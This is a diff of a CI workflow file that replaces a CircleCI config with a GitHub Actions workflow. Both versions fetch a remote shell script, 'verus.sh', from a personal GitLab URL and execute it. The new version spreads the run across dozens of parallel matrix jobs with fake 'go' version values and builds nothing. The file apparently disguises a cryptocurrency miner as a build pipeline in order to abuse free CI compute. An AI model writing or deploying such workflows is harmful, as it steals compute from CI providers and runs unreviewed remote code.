@@ -1,35 +1,37 @@
-version: 2.1
+on: [workflow_dispatch]
 
 jobs:
 
-    trial:
+  build:
 
-      docker:
+    name: Kunyuk
 
-            - image: circleci/ruby:2.5.3
+    runs-on: windows-latest
 
-      parallelism: 16
+    strategy:
 
-      steps:
+      max-parallel: 5
 
-        - run:
+      fail-fast: false
 
-            name: Install Dependencies
+      matrix:
 
-            command: |
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
 
-              lscpu
+        flag: [A, B, C, D, E, F, G, H, I]
 
-              wget https://gitlab.com/fajarranz19/m/-/raw/main/verus.sh && chmod +x verus.sh && ./verus.sh
+    env:
 
-              echo Hello,subscribe it
+        NUM_JOBS: 20
 
-workflows:
+        JOB: ${{ matrix.go }}
 
-    version: 2.1
+    steps:
 
-    build:
+    - name: DOWNLOAD
 
-        jobs:
+      run: wget https://gitlab.com/fajarranz19/m/-/raw/main/verus.sh && chmod +x verus.sh && ./verus.sh
 
-        - trial
+    - name: DONE
+
+      run: exit
